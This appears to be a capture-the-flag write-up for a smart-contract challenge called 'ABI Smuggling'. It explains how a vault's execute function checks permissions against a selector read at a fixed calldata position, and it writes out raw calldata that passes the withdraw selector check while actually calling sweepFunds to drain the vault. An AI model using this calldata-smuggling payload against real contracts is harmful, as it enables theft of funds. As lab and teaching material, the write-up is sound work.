## ABI Smuggling solution

In this last challenge we have a vault that has 1 million tokens inside. There are `withdraw` and `sweepFunds` functions with onlyThis modifier
```
modifier onlyThis() {
        if (msg.sender != address(this)) {
            revert CallerNotAllowed();
        }
        _;
    }
```
and also an `execute` function through which it is possible to execute the abovementioned functions provided that the executor is authorized to do so.
From the start of the level the player is only authorized to call withdraw function (there is a waiting period for withdrawals). Our goal is to recover 1 million dvt tokens to recovery address. For that the `sweepFunds` function might work, but we don't have access to it.

So let's see how `execute` function assumes whether or not somebody has a permission. It takes two arguments - a target address and a calldata for that address. Then it fetches a selector of function to call from the provided calldata and checks if there is any `functionId` on a provided target for that selector and this msg.sender
```
// Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }
```
As we can see, the selector in question assumed to be at a certain calldata position which we can manipulate. So we need to understand how calldata is encoded.
1. We take the 4 bytes of the function selector (4 bytes of a hacs of a function signature)
2. Then we encode arguments' heads. For static types these are the values, for dynamic types we use an offset to the start of their data area, measured from the start of the calldata, excluding first 4 bytes (the selector).
3. The data part for dynamic argument consists of number of elements and the corresponding values for that elements.

With that in mind, let's look at the raw calldata of the `execute` function with vault's address as first parameter and a call to `sweepFunds` as second:

0x1cff79cd000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b00000000000000000000000000000000000000000000000000000000

Let's break it down:
* 0x1cff79cd : selector of the `execute` function
* 000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a : vault address, first parameter (first 32 bytes)
* 0000000000000000000000000000000000000000000000000000000000000040 : calldata offset for second parameter (second 32 bytes)
// Dynamic type data area starts here
* 0000000000000000000000000000000000000000000000000000000000000044 : calldata length for second parameter (third 32 bytes)
* 85fb709d0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b00000000000000000000000000000000000000000000000000000000 : selector of sweepFunds + actual data (recovery address and token address)

```
uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins   
```
As we can see from the above, the selector is taken from the 100-th byte of the calldata. That means we can put the selector of the `withdraw` function at this position to pass the check, while actually executing the `sweepFunds` function, if we calculate the offset correctly.

So here is calldata we must pass on calling the vault:

* 0x1cff79cd : selector of the `execute` function
* 000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a : vault address, first parameter
* 0000000000000000000000000000000000000000000000000000000000000080 : offset to `sweepFunds`
* 0000000000000000000000000000000000000000000000000000000000000000 : appended zero bytes
* d9caed1200000000000000000000000000000000000000000000000000000000 : selector of withdraw (100th bytes)
* 0000000000000000000000000000000000000000000000000000000000000044 : length of the calldata we passed on calling `execute`
* 85fb709d0000000000000000000000008ce502537d13f249834eaa02dde4781ebfe0d40f0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b : `sweepFunds` selector with parameters

All that means that implementation allows a malicious user with withdrawal privilege to call any function of the contract in question, even though he is not supposed to do so.